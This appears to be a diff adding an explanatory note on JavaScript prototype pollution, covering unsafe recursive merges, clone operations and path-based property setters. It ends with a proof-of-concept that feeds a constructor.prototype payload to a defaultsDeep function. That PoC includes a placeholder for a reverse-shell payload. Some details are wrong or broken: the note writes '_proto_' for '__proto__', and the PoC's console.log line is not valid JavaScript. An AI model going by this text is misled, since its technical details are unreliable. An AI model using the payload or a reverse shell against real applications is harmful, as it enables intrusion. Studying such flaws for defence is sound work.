@@ -1,0 +1,34 @@
+merge (target, source)
+
+  foreach property of source
+
+    if property exists and is an object on both the target and the source
+
+      merge(target[property], source[property])
+
+    else
+
+      target[property] = source[property]
+      
+ When the source object contains a property named _proto_ defined with Object.defineProperty() , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of Object and the source of Object as defined by the attacker. Properties are then copied on the Object prototype.
+
+Clone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: merge({},source).
+
+lodash and Hoek are examples of libraries susceptible to recursive merge attacks.
+
+Property definition by path
+There are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: theFunction(object, path, value)
+
+If the attacker can control the value of “path”, they can set this value to _proto_.myValue. myValue is then assigned to the prototype of the class of the object.
+PoC 
+const mergeFn = require('app').defaultsDeep;
+const payload = '{"constructor": {"prototype": {"a0": true}}}'
+
+function check() {
+    mergeFn({}, JSON.parse(payload));
+    if (({})[`a0`] === true) {
+        console.log( ${pyload like reverse shell javascript });
+    }
+  }
+
+check();
